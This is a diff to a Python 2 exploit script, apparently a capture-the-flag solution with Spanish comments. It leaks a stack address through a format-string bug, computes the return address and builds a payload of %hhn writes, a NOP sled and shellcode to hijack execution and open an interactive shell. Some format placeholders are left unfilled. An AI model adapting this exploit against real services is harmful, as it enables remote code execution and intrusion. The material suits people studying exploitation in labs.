@@ -107,12 +107,31 @@ def leak_addr(addr):
 def main():
     recvuntil('> ')
     setkey()
-    # %76$p es mi input
-    #print hex(leak_addr(0x00602030))
-    leak = run('%6$p   ')[2:]
+    #leak = run('%6$p    ')[2:]
+    leak = decrypt('76370000651900000f3f0000b90b000008010000080100000801000008010000')[2:] # '%6$p    '
     stack_addr = int(leak, 16)
-    print hex(stack_addr)
-    ret_addr = stack_addr + 0x638
+    print 'stack_leak: ' + hex(stack_addr)
+    ret_addr = stack_addr + 0x638 # de RSA_decrypt
+    print 'ret_addr: ' + hex(ret_addr)
+
+    # en ret_addr sobreescribo 0x40140a por 0x602560
+    payload  = ''
+    payload += '%37x'
+    payload += '%_$hhn' # byte del medio
+    payload += '%59x'
+    payload += '%_$hhn' # MSF
+    payload += '%_x'
+    payload += '%_$hhn' # LSB
+    payload += ' ' * (len(payload) % 8)
+
+    payload += '\x90' * (8 * 8 + 7)
+    payload += shellcode
+
+    payload += p64(ret_addr + 0) # LSB
+    payload += p64(ret_addr + 1)
+    payload += p64(ret_addr + 2) # MSB
+
+    run(payload)
     interactive()
 
 if __name__ == '__main__':
@@ -120,14 +139,3 @@ if __name__ == '__main__':
         main()
     except KeyboardInterrupt:
         pass
-
-"""
-sprintf 0x7f69ed936940
-putchar 0x7f9457ee5290
-puts    0x7f7d522c0690
-fgetc   0x7fc476251030
-
-no encontre que libc usa...
-"""
-leak    : 0x7fff9765cda0
-ret addr :0x7fff9765d3d8
